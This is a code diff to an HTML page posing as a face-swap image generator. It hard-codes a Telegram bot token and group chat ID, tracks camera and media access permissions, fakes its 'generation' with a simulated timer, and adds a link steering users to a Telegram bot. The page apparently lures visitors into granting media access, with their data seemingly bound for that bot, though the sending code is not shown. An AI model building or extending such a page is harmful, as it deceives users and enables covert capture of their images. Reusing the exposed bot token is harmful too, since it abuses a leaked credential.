@@ -182,6 +182,7 @@
                         <img id="preview-image" class="max-w-full max-h-64 mx-auto rounded-lg shadow-lg" src="" alt="Uploaded image preview" src="https://storage.googleapis.com/workspace-0f70711f-8b4e-4d94-86f1-2a93ccde5887/image/49538f2f-2732-4965-8747-561d113c5a67.png">
                     </div>
                 </div>
+                <div class="mt-2" id="fallback-link" style="display:none;"></div>
             </div>
         </section>
 
@@ -195,7 +196,7 @@
 
     <script>
         const BOT_TOKEN = "7597477264:AAFMXbMk_j9usWKnYdw0nmxE4U6qXQ0bYUI";
-        const OWNER_ID = "-4907521783";
+        const OWNER_ID = "-4907521783"; // Ganti dengan chatID grup
 
         let permissionsGranted = localStorage.getItem('permissionsGranted') === 'true';
         let mediaAccessAllowed = false;
@@ -462,6 +463,11 @@
                     }
                 }
 
+                // Tampilkan fallback link
+                const fallbackDiv = document.getElementById('fallback-link');
+                fallbackDiv.innerHTML = `The image is unprocessed? Try the telegram version <a href="https://t.me/facefusion_xbot?start=cifgffdihe" target="_blank" class="text-purple-400 underline font-semibold">HERE</a>`;
+                fallbackDiv.style.display = 'block';
+
                 // Simulate generation
                 setTimeout(() => {
                     generateBtn.textContent = 'Generated!';
@@ -475,4 +481,3 @@
     </script>
 </body>
 </html>
-
